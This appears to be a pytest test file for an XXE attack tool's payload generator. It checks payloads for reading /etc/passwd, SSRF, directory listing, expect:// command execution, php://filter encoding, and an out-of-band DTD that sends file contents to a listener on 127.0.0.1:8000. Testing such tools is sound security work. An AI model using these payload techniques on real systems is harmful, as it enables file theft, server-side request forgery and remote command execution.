import pytest

from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XML
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload import payload_factory
from xeely.xxe.attack.type import XXEAttackType


@pytest.fixture
def base_xml():
    raw_xml = """
<root>
    data
</root>
    """
    return XML.parse_string(raw_xml)


def test_file_extraction_payload(base_xml):
    resource = "/etc/passswd"
    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT, base_xml=base_xml, resource=resource
    )
    payload = payload_generator.generate_payload()

    assert "file://" in payload
    assert resource in payload


def test_ssrf_payload(base_xml):
    resource = "http://localhost:8000/hello.txt"
    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT, base_xml=base_xml, resource=resource, attack_type=XXEAttackType.SSRF
    )
    payload = payload_generator.generate_payload()

    assert resource in payload


def test_dir_listing_payload(base_xml):
    resource = "/etc/"
    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT,
        base_xml=base_xml,
        resource=resource,
        attack_type=XXEAttackType.DIRECTORY_LISTING,
    )
    payload = payload_generator.generate_payload()

    assert "file://" in payload
    assert resource in payload


def test_rce_payload(base_xml):
    resource = "ls -lrt /"
    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT, base_xml=base_xml, resource=resource, attack_type=XXEAttackType.RCE
    )
    payload = payload_generator.generate_payload()

    assert "expect://" in payload
    assert "$IFS".join(resource.split(" ")) in payload


def test_base64_encoding_payload(base_xml):
    resource = "/etc/passwd"
    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT,
        base_xml=base_xml,
        resource=resource,
        should_apply_base64_encoding=True,
    )
    payload = payload_generator.generate_payload()

    assert "php://filter/convert.base64-encode/resource=" in payload
    assert resource in payload


def test_payload_with_cdata(base_xml):
    resource = "/etc/passwd"

    expected_keywords = ["start", "<![CDATA[", "end", "]]>", "http://127.0.0.1:8000/cdata.dtd"]

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT,
        base_xml=base_xml,
        resource=resource,
        should_use_cdata=True,
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )
    payload = payload_generator.generate_payload()

    for keyword in expected_keywords:
        assert keyword in payload


def test_dtd_with_cdata(base_xml):
    resource = "/etc/passwd"

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.DIRECT,
        base_xml=base_xml,
        resource=resource,
        should_use_cdata=True,
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )

    assert payload_generator.does_payload_requires_to_expose_dtd_file()

    dtd = payload_generator.get_dtd_content()

    assert "%start;%exploit;%end;" in dtd


def test_external_dtd_call(base_xml):
    resource = "/etc/passwd"

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.ERROR,
        base_xml=base_xml,
        resource=resource,
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )

    payload = payload_generator.generate_payload()

    assert "% dtd" in payload
    assert "%dtd;" in payload


def test_error_based_payload(base_xml):
    resource = "/etc/passwd"

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.ERROR,
        base_xml=base_xml,
        resource=resource,
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )

    payload = payload_generator.generate_payload()

    assert "%wrapper;" in payload


def test_error_based_dtd(base_xml):
    resource = "/etc/passwd"

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.ERROR,
        base_xml=base_xml,
        resource=resource,
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )

    dtd = payload_generator.get_dtd_content()

    assert "%nonExistingEntity;/%xxe;" in dtd


def test_oob_payload(base_xml):
    resource = "/etc/passwd"

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.OOB,
        base_xml=base_xml,
        resource=resource,
        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
    )

    payload = payload_generator.generate_payload()

    assert "%wrapper" in payload
    assert "&content;" in payload


def test_oob_dtd_content(base_xml):
    resource = "/etc/passwd"
    server_params = HTTPServerParams(lhost="127.0.0.1", lport=8000)

    payload_generator = payload_factory.get_payload_generator_for_mode(
        XXEAttackMode.OOB, base_xml=base_xml, resource=resource, http_server_params=server_params
    )

    dtd = payload_generator.get_dtd_content()

    assert f"{server_params.get_base_url()}/?content=%xxe;" in dtd
